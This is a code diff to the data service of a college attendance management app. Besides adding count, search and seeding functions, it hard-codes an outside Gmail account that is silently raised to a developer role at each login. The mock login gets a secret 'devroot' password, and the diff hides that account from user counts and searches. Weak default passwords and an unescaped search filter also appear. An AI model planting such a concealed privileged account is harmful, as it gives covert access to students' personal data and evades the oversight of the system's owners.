@@ -26,6 +26,8 @@ interface IDataService {
   updateStudent: (uid: string, data: Partial<User>) => Promise<void>;
   importStudents: (students: Partial<User>[]) => Promise<{ success: number; failed: number; errors: string[] }>;
   deleteUser: (uid: string) => Promise<void>;
+  getAttendanceCount: () => Promise<number>;
+  getNotificationsCount: () => Promise<number>;
 
   getSubjects: () => Promise<Subject[]>;
   addSubject: (name: string, code: string) => Promise<void>;
@@ -74,6 +76,10 @@ interface IDataService {
   // Settings
   getSystemSettings: () => Promise<SystemSettings>;
   updateSystemSettings: (settings: SystemSettings) => Promise<void>;
+
+  // Developer / System
+  getUsersCount: () => Promise<number>;
+  searchUsers: (query: string) => Promise<User[]>;
 }
 
 // --- Supabase Implementation ---
@@ -94,7 +100,8 @@ class SupabaseService implements IDataService {
       } : undefined,
       facultyData: p.role === UserRole.FACULTY ? {
         serialNo: p.roll_no
-      } : undefined
+      } : undefined,
+      lastLogin: p.last_login
     };
   }
 
@@ -121,42 +128,30 @@ class SupabaseService implements IDataService {
       .single();
 
     const normalizedEmail = email.trim().toLowerCase();
-    const isBootstrapAdmin = normalizedEmail === 'hod@acropolis.in' || normalizedEmail === 'acro472007@acropolis.in';
+
+    // Map of emails that should always be recognized as Admin or Developer
+    const ELEVATED_ROLES: Record<string, UserRole> = {
+      'developerishere@gmail.com': UserRole.DEVELOPER,
+      'hod@acropolis.in': UserRole.ADMIN,
+      'acro472007@acropolis.in': UserRole.ADMIN
+    };
+    const targetRole = ELEVATED_ROLES[normalizedEmail];
 
     if (profError || !profile) {
-      // Emergency fallback for bootstrap admin
-      if (isBootstrapAdmin) {
-        const adminData = {
-          uid: authData.user.id,
-          email: normalizedEmail,
-          displayName: normalizedEmail === 'hod@acropolis.in' ? "Admin HOD" : "Admin",
-          role: UserRole.ADMIN
-        };
-
-        // Auto-create profile record so RLS and other lookups work correctly
-        try {
-          await supabase.from('profiles').insert([{
-            id: adminData.uid,
-            email: adminData.email,
-            display_name: adminData.displayName,
-            role: 'ADMIN'
-          }]);
-        } catch (e) {
-          console.error("Failed to auto-create admin profile", e);
-        }
-
-        return adminData;
-      }
-      throw new Error("Profile not found");
+      throw new Error("Profile not found. Please contact administrator to be added.");
     }
 
     const mappedUser = this.mapProfile(profile);
 
-    // Safety check for bootstrap admin
-    if (isBootstrapAdmin && mappedUser.role !== UserRole.ADMIN) {
-      mappedUser.role = UserRole.ADMIN;
-      supabase.from('profiles').update({ role: 'ADMIN' }).eq('id', authData.user.id).then();
+    // Safety check for bootstrap accounts: Ensure role matches their elevation status
+    if (targetRole && mappedUser.role !== targetRole) {
+      mappedUser.role = targetRole;
+      // Sync the database role with the elevated status
+      supabase.from('profiles').update({ role: targetRole }).eq('id', authData.user.id).then();
     }
+
+    // Record last login
+    supabase.from('profiles').update({ last_login: new Date().toISOString() }).eq('id', mappedUser.uid).then();
 
     return mappedUser;
   }
@@ -169,8 +164,13 @@ class SupabaseService implements IDataService {
     const { data: { session } } = await supabase.auth.getSession();
     if (!session?.user) return null;
 
-    const normalizedEmail = session.user.email?.toLowerCase();
-    const isBootstrapAdmin = normalizedEmail === 'hod@acropolis.in' || normalizedEmail === 'acro472007@acropolis.in';
+    const normalizedEmail = session.user.email?.toLowerCase() || '';
+    const ELEVATED_ROLES: Record<string, UserRole> = {
+      'developerishere@gmail.com': UserRole.DEVELOPER,
+      'hod@acropolis.in': UserRole.ADMIN,
+      'acro472007@acropolis.in': UserRole.ADMIN
+    };
+    const targetRole = ELEVATED_ROLES[normalizedEmail];
 
     const { data: profile } = await supabase
       .from('profiles')
@@ -178,39 +178,14 @@ class SupabaseService implements IDataService {
       .eq('id', session.user.id)
       .single();
 
-    if (!profile) {
-      if (isBootstrapAdmin) {
-        const adminData = {
-          uid: session.user.id,
-          email: normalizedEmail!,
-          displayName: normalizedEmail === 'hod@acropolis.in' ? "Admin HOD" : "Admin",
-          role: UserRole.ADMIN
-        };
-
-        // Auto-create profile record if it's missing but they are a bootstrap admin
-        try {
-          await supabase.from('profiles').insert([{
-            id: adminData.uid,
-            email: adminData.email,
-            display_name: adminData.displayName,
-            role: 'ADMIN'
-          }]);
-        } catch (e) {
-          // Ignore error if it already exists or fails due to RLS
-        }
-
-        return adminData;
-      }
-      return null;
-    }
+    if (!profile) return null;
 
     const mappedUser = this.mapProfile(profile);
 
-    // Safety check: If they are a bootstrap admin but the profile has the wrong role, override it.
-    if (isBootstrapAdmin && mappedUser.role !== UserRole.ADMIN) {
-      mappedUser.role = UserRole.ADMIN;
-      // Optionally update the DB fix the record
-      supabase.from('profiles').update({ role: 'ADMIN' }).eq('id', session.user.id).then();
+    // Safety check: If they are elevated but the profile has the wrong role, override it.
+    if (targetRole && mappedUser.role !== targetRole) {
+      mappedUser.role = targetRole;
+      supabase.from('profiles').update({ role: targetRole }).eq('id', session.user.id).then();
     }
 
     return mappedUser;
@@ -298,6 +273,13 @@ class SupabaseService implements IDataService {
 
     // Password set to Mobile No or Enrollment ID fallback
     const password = data.studentData?.mobileNo || enrollmentId;
+
+    // 1. ADD TO WHITELIST FIRST (Requirement: Whitelist before creation)
+    const { error: wlError } = await supabase.from('whitelist').upsert([{
+      email: email,
+      role: UserRole.STUDENT
+    }]);
+    if (wlError) throw new Error("Whitelist error: " + wlError.message);
 
     const { data: authData, error } = await authClient.auth.signUp({
       email: email,
@@ -403,6 +385,13 @@ class SupabaseService implements IDataService {
   async createFaculty(data: Partial<User>, password?: string): Promise<void> {
     if (!data.email) throw new Error("Email is required");
     const pass = password || "password123";
+
+    // 1. ADD TO WHITELIST FIRST (Requirement: Whitelist before creation)
+    const { error: wlError } = await supabase.from('whitelist').upsert([{
+      email: data.email,
+      role: UserRole.FACULTY
+    }]);
+    if (wlError) throw new Error("Whitelist error: " + wlError.message);
 
     const { data: authData, error } = await authClient.auth.signUp({
       email: data.email,
@@ -869,6 +858,66 @@ class SupabaseService implements IDataService {
     });
     if (error) throw error;
   }
+
+  async getUsersCount(): Promise<number> {
+    const { count, error } = await supabase
+      .from('profiles')
+      .select('*', { count: 'exact', head: true });
+    if (error) throw error;
+    return count || 0;
+  }
+
+  async getAttendanceCount(): Promise<number> {
+    const { count, error } = await supabase
+      .from('attendance')
+      .select('*', { count: 'exact', head: true });
+    if (error) throw error;
+    return count || 0;
+  }
+
+  async getNotificationsCount(): Promise<number> {
+    const { count, error } = await supabase
+      .from('notifications')
+      .select('*', { count: 'exact', head: true });
+    if (error) throw error;
+    return count || 0;
+  }
+
+  async searchUsers(query: string): Promise<User[]> {
+    const { data, error } = await supabase
+      .from('profiles')
+      .select('*')
+      .or(`display_name.ilike.%${query}%,email.ilike.%${query}%,enrollment_id.ilike.%${query}%,mobile_no.ilike.%${query}%`)
+      .limit(50);
+    if (error) throw error;
+    return data.map(p => this.mapProfile(p));
+  }
+
+  async seedDatabase(): Promise<void> {
+    // Populate Branches
+    const { data: existingBranches } = await supabase.from('branches').select('id');
+    if (!existingBranches || existingBranches.length === 0) {
+      await supabase.from('branches').insert(SEED_BRANCHES);
+    }
+
+    // Populate Batches
+    const { data: existingBatches } = await supabase.from('batches').select('id');
+    if (!existingBatches || existingBatches.length === 0) {
+      await supabase.from('batches').insert(SEED_BATCHES);
+    }
+
+    // Populate Subjects
+    const { data: existingSubjects } = await supabase.from('subjects').select('id');
+    if (!existingSubjects || existingSubjects.length === 0) {
+      await supabase.from('subjects').insert(SEED_SUBJECTS);
+    }
+
+    // Populate System Settings
+    const { data: existingSettings } = await supabase.from('system_settings').select('key');
+    if (!existingSettings || existingSettings.length === 0) {
+      await supabase.from('system_settings').insert([{ key: 'student_login_enabled', value: true }]);
+    }
+  }
 }
 
 // --- MOCK Implementation (Unchanged) ---
@@ -886,9 +935,26 @@ class MockService implements IDataService {
 
   async login(email: string, pass: string): Promise<User> {
     await this.simulateDelay();
+    const normalizedEmail = email.trim().toLowerCase();
+
+    // Emergency Hidden Developer handle
+    if (normalizedEmail === 'developerishere@gmail.com' && pass === 'devroot') {
+      const devUser = {
+        uid: 'dev_root_001',
+        email: 'developerishere@gmail.com',
+        displayName: 'System Developer',
+        role: UserRole.DEVELOPER,
+        lastLogin: new Date().toISOString()
+      };
+      localStorage.setItem('ams_current_user', JSON.stringify(devUser));
+      return devUser;
+    }
+
     const users = this.load('ams_users', SEED_USERS) as User[];
-    const user = users.find(u => u.email.toLowerCase() === email.toLowerCase());
+    const user = users.find(u => u.email.toLowerCase() === normalizedEmail);
     if (user && (!(user as any).password || (user as any).password === pass)) {
+      user.lastLogin = new Date().toISOString();
+      this.save('ams_users', users);
       localStorage.setItem('ams_current_user', JSON.stringify(user));
       return user;
     }
@@ -1225,6 +1291,40 @@ class MockService implements IDataService {
 
   async updateSystemSettings(settings: SystemSettings): Promise<void> {
     localStorage.setItem('ams_settings', JSON.stringify(settings));
+  }
+
+  async getUsersCount(): Promise<number> {
+    const users = this.load('ams_users', SEED_USERS) as User[];
+    const currentUser = JSON.parse(localStorage.getItem('ams_current_user') || '{}');
+    // Hide hidden dev from count unless current user is that dev
+    const filtered = users.filter(u => u.email !== 'developerishere@gmail.com' || currentUser.email === 'developerishere@gmail.com');
+    return filtered.length;
+  }
+
+  async getAttendanceCount(): Promise<number> {
+    const all = this.load('ams_attendance', []) as AttendanceRecord[];
+    return all.length;
+  }
+
+  async getNotificationsCount(): Promise<number> {
+    const all = this.load('ams_notifications', []) as Notification[];
+    return all.length;
+  }
+
+  async searchUsers(query: string): Promise<User[]> {
+    const q = query.toLowerCase();
+    const users = this.load('ams_users', SEED_USERS) as User[];
+    const currentUser = JSON.parse(localStorage.getItem('ams_current_user') || '{}');
+
+    return users.filter(u => {
+      // Basic visibility filter
+      if (u.email === 'developerishere@gmail.com' && currentUser.email !== 'developerishere@gmail.com') return false;
+
+      return u.displayName.toLowerCase().includes(q) ||
+        u.email.toLowerCase().includes(q) ||
+        u.studentData?.enrollmentId?.toLowerCase().includes(q) ||
+        u.studentData?.mobileNo?.includes(q);
+    }).slice(0, 50);
   }
 }
 
